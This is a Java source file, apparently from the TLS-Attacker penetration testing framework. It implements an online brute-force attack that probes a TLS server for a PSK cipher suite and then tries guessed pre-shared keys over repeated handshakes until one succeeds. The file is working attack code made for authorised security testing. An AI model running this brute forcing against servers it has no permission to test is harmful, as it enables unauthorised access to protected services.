/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.attacks.bruteforce.GuessProvider;
import de.rub.nds.tlsattacker.attacks.bruteforce.GuessProviderFactory;
import de.rub.nds.tlsattacker.attacks.config.PskBruteForcerAttackServerCommandConfig;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.CipherSuite;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
import java.util.concurrent.TimeUnit;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 *
 */
public class PskBruteForcerAttackServer extends Attacker<PskBruteForcerAttackServerCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    private GuessProvider guessProvider;

    /**
     *
     * @param config
     * @param baseConfig
     */
    public PskBruteForcerAttackServer(PskBruteForcerAttackServerCommandConfig config, Config baseConfig) {
        super(config, baseConfig);
    }

    @Override
    public void executeAttack() {
        CONSOLE.info("Connecting to the Server to find a PSK ciphersuite he supports...");
        CipherSuite suite = getSupportedPskCiphersuite();
        if (suite == null) {
            CONSOLE.info("Stopping attack");
        }
        CONSOLE.info("The server supports "
                + suite
                + ". Trying to guess the PSK. This is an online Attack. Depending on the PSK this may take some time...");
        guessProvider = GuessProviderFactory.createGuessProvider(config.getGuessProviderType(),
                config.getGuessProviderInputStream());
        boolean result = false;
        int counter = 0;
        long startTime = System.currentTimeMillis();
        while (!result) {
            byte[] guessedPsk = guessProvider.getGuess();
            if (guessedPsk == null) {
                CONSOLE.info("Could not find psk - attack stopped");
                break;
            }
            if (guessedPsk.length == 0) {
                continue;
            }
            counter++;
            if (LOGGER.isDebugEnabled()) {
                LOGGER.debug("Guessing: " + ArrayConverter.bytesToHexString(guessedPsk));
            }
            result = executeProtocolFlowToServer(suite, guessedPsk);
            if (result) {
                long stopStime = System.currentTimeMillis();
                CONSOLE.info("Found the psk in "
                        + String.format(
                                "%d min, %d sec",
                                TimeUnit.MILLISECONDS.toMinutes(stopStime - startTime),
                                TimeUnit.MILLISECONDS.toSeconds(stopStime - startTime)
                                        - TimeUnit.MINUTES.toSeconds(TimeUnit.MILLISECONDS.toMinutes(stopStime
                                                - startTime))));
                CONSOLE.info("Guessed " + counter + " times");
            }
        }
    }

    /**
     *
     * @return
     */
    @Override
    public Boolean isVulnerable() {
        CONSOLE.info("Connecting to the Server...");
        boolean supportsPsk = getSupportedPskCiphersuite() != null;
        if (supportsPsk) {
            CONSOLE.info("Maybe vulnerable - server supports PSK");
            return null;
        } else {
            CONSOLE.info("Not Vulnerable - server does not support PSK");
            return false;
        }
    }

    private CipherSuite getSupportedPskCiphersuite() {
        Config tlsConfig = getTlsConfig();

        String clientIdentity = config.getPskIdentity();
        LOGGER.debug("Client Identity: " + clientIdentity);
        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.HELLO,
                RunningModeType.CLIENT);
        State state = new State(tlsConfig, trace);
        WorkflowExecutor executor = WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(),
                state);
        executor.executeWorkflow();
        if (WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.SERVER_HELLO, trace)) {
            return state.getTlsContext().getSelectedCipherSuite();
        } else {
            CONSOLE.info("Did not receive a ServerHello. The Server does not seem to support any of the tested PSK cipher suites.");
            LOGGER.debug("We tested for the following cipher suites:");
            for (CipherSuite suite : tlsConfig.getDefaultClientSupportedCiphersuites()) {
                LOGGER.debug(suite.name());
            }
            return null;
        }
    }

    private boolean executeProtocolFlowToServer(CipherSuite suite, byte[] pskGuess) {
        Config tlsConfig = getTlsConfig();
        tlsConfig.setDefaultClientSupportedCiphersuites(suite);
        tlsConfig.setDefaultSelectedCipherSuite(suite);
        tlsConfig.setDefaultPSKKey(pskGuess);
        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(
                WorkflowTraceType.HANDSHAKE, RunningModeType.CLIENT);
        State state = new State(tlsConfig, trace);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                tlsConfig.getWorkflowExecutorType(), state);
        workflowExecutor.executeWorkflow();
        if (state.getWorkflowTrace().executedAsPlanned()) {
            CONSOLE.info("PSK " + ArrayConverter.bytesToHexString(pskGuess));
            return true;
        } else {
            return false;
        }
    }
}
